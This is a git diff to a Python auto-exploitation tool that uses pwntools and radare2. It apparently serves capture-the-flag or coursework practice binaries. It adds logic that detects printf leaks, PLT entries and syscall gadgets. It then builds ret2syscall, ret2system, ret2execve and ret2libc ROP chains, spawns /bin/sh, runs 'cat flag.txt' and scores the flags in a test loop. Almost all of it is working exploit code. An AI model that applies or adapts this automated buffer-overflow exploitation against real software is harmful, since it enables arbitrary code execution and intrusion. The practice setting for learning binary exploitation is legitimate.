@@ -44,31 +44,115 @@ class App:
         self.pipe.cmd("aaa")
         self.elf = self.pipe.cmd("aflj")
         
-        self.ret2execve(binary)
-        #self.generate_rop_chain({"rax": 0x3b, "rdi": 0xcafebabe, "rsi": 0, "rdx": 0})
-
-
+    
     # ============= EXPLOITS SECTION ===============
 
     # this is the function that will detect what exploit to use and call it 
     def handle_exploits(self, binary):
-        # check for "win" in pwnelf.sym -- ret2win/rop params
-        # check for "system" in pwnelf.plt -- ret2system 
-        # check for "execve" in pwnelf.plt -- ret2execve
-
+        printf = self.detect_printf_vuln(binary)
+        win = False
+        libc_leak = None
+        syscall = None
+        
         # printf vulns -- read/write/got overwrite
+        if printf == "printf":
+            return
+        
+        elif printf == "libc":
+            # libc leak -- ret2one
+            print("[*] ret2one detected.")
+            
+            vuln = json.loads(self.pipe.cmd("pdfj @ sym.vuln"))
+            libc_leak = self.find_given_leaks(vuln)
+            
+            flag = self.ret2one(binary, libc_leak)
 
-        # array abuse
+            if not flag:
+                print("[*] Running without a ret")
 
-        # libc leak -- ret2one
-        # syscall gadget -- ret2syscall
-        # write gadget -- write gadgets
-        pass
+                flag = self.ret2one(binary, libc_leak, False)
 
-    def ret2syscall(self, binary, excempt=0):
+                if not flag:
+                    # angr!!
+                    pass
+
+            return flag.decode()
+
+        # check for "win" in pwnelf.sym -- ret2win/rop params
+        if "win" in self.pwnelf.sym.keys():
+            win = True
+            #self.ret2win(binary)
+
+        # check for "execve" in pwnelf.plt -- ret2execve
+        if "execve" in self.pwnelf.plt.keys():
+            print("[*] ret2execve detected.")
+            
+            flag = self.ret2execve(binary)
+
+            if not flag:
+                # angr!!
+                pass
+
+            return flag.decode()
+
+        # check for "system" in pwnelf.plt -- ret2system 
+        if "system" in self.pwnelf.plt.keys():
+            print("[*] ret2system detected.")
+
+            flag = self.ret2system(binary)
+
+            if not flag:
+                # run without ret and then angr!!
+                print("[*] Running without a ret")
+
+                flag = self.ret2system(binary)
+
+                if not flag:
+                    # angr!!
+                    pass
+
+            return flag.decode()
+
+        # array abuse -- order subject to change
+
+
+        # syscall gadget -- ret2syscall 
+        for file, gadget in self.rs.search(search="syscall"):
+            if "syscall;" in str(gadget):
+                syscall = int(str(gadget).split(":")[0], 16)
+                break
+
+        if syscall:
+            print("[*] ret2syscall detected.")
+
+            flag = self.ret2syscall(binary, syscall)
+
+            if not flag:
+                print("[*] Shortening ROP chain 1.")
+
+                flag = self.ret2syscall(binary, syscall, 1)
+
+            if not flag:
+                print("[*] Shortening ROP chain 2.")
+
+                flag = self.ret2syscall(binary, syscall, 2)
+
+            if not flag:
+                print("[*] Shortening ROP chain 3.")
+
+                flag = self.ret2syscall(binary, syscall, 3)
+
+            if not flag:
+                # angr!!
+                pass
+
+            return flag.decode()
+
+        # write gadget -- write gadgets -- order subject to change
+
+    def ret2syscall(self, binary, syscall, excempt=0):
         io = process(binary)
 
-        syscall = None
         binsh = next(self.pwnelf.search(b"/bin/sh"))
         payload = self.find_overflow(binary)
 
@@ -83,19 +167,29 @@ class App:
         elif excempt == 3:
             payload += self.generate_rop_chain({"rax": 0x3b, "rdi": binsh})
         else:
-            print("[!] ret2syscall fail.")
+            print("[!] out of excemptions.")
             return None
-
-        for file, gadget in self.rs.search(search="syscall"):
-            if "syscall;" in str(gadget):
-                syscall = int(str(gadget).split(":")[0], 16)
-                break
 
         payload += p64(syscall)
 
         io.sendlineafter(b">>>", payload)
 
-        io.interactive()
+        try:
+            io.sendlineafter(b"<<<", b"cat flag.txt")
+
+            io.recvline()
+            flag = io.recvline()[:-1]
+
+            io.close()
+
+            return flag
+
+        except:
+            io.close()
+
+            print("[!] ret2syscall did not work.")
+            return None
+
 
     def ret2system(self, binary, add_ret=True):
         io = process(binary)
@@ -117,40 +211,63 @@ class App:
         payload += p64(self.pwnelf.plt["system"])
 
         io.sendlineafter(b">>>", payload)
-        
-        io.interactive()
 
-    def ret2execve(self, binary, add_ret=True):
+        try:
+            io.recvline()
+            io.recvline()
+            flag = io.recvline()[:-1]
+            
+
+            io.close()
+
+            return flag
+
+        except:
+            io.close()
+            
+            print("[!] ret2system did not work.")
+            return None
+        
+
+    def ret2execve(self, binary):
         io = process(binary)
 
-        binsh = next(self.pwnelf.search(b"/bin/sh"))
-        ret = None
+        try:
+            binsh = next(self.pwnelf.search(b"/bin/sh"))
 
-        for file, gadget in self.rs.search(search="ret"):
-            if "ret;" in str(gadget):
-                ret = int(str(gadget).split(":")[0], 16)
-                break
+        except:
+            io.close()
+
+            print("[!] /bin/sh not found in ret2execve!")
+            return None
 
         payload = self.find_overflow(binary)
         payload += self.generate_rop_chain({"rdi":binsh, "rsi":0, "rdx":0})
         
-        if add_ret:
-            payload += p64(ret)
-
         payload += p64(self.pwnelf.plt["execve"])
 
         io.sendlineafter(b">>>", payload)
 
-        io.interactive()
+        try:
+            io.sendline(b"cat flag.txt")
+            io.recvline()
+            flag = io.recvline()[:-1]
+
+            io.close()
+
+            return flag
+
+        except:
+            io.close()
+
+            print("[!] ret2execve failed.")
+            return None
 
 
     # in my test bins, one_gadget does not want to work
     # ret2libc works though
-    def ret2one(self, binary, add_ret=True):
+    def ret2one(self, binary, leaked_function, add_ret=True):
         io = process(binary) 
-
-        vuln = json.loads(self.pipe.cmd("pdfj @ sym.vuln"))
-        leaked_function = self.find_given_leaks(vuln)
        
         io.recvuntil(b"<<< Leak: ")
         leak = io.recvline()
@@ -175,9 +292,8 @@ class App:
 
         payload = self.find_overflow(binary)
 
-        print("[*] Attempting ret2libc")
         payload += p64(pop_rdi)
-        payload += p64(next(self.pwnlibc.search("/bin/sh")) + libcoff)
+        payload += p64(next(self.pwnlibc.search(b"/bin/sh")) + libcoff)
 
         if add_ret:
             payload += p64(ret)
@@ -186,8 +302,22 @@ class App:
 
         io.sendlineafter(b">>>", payload)
 
-        io.interactive()
-         
+        try:
+            io.sendline(b"cat flag.txt")
+            io.recvline()
+            io.recvline()
+            flag = io.recvline()[:-1]
+
+            io.close()
+
+            return flag
+
+        except:
+            io.close()
+
+            print("[!] ret2one failed.")
+            return None
+
 
     # ======================= STATIC SECTION ==========================
     
@@ -374,10 +504,18 @@ class App:
     def detect_printf_vuln(self, binary):
         io = process(binary)
 
+        out = io.recvuntil(b">>>")
+        
+        if b"0x" in out:
+            return "libc"
+
         io.sendline(b"%p")
         out = io.recv()
 
-        return b"0x" in out
+        if b"0x" in out:
+            return "printf"
+
+        return None
     
     # using a universal function did not work :(
     # creating gdb script on the fly instead
@@ -499,5 +637,20 @@ class App:
         return addresses 
 
 if __name__ == "__main__":
-    app = App(argv[1])
+    # testing grounds
+    bins = [ f"./ace-student/test-bins/bin-ret2one-{i}" for i in range(10) ]
+    count = 0
+    start = time.time()
+    
+    for binary in bins:
+        app = App(binary)
+        flag = app.handle_exploits(binary)
+
+        if flag == "flag{your_mom}":
+            count += 1
+
+    end = time.time()
+    print(f"==== Test conclusion: {count}/10 in {end - start} seconds. ====")
+
+    #app = App(argv[1])
 
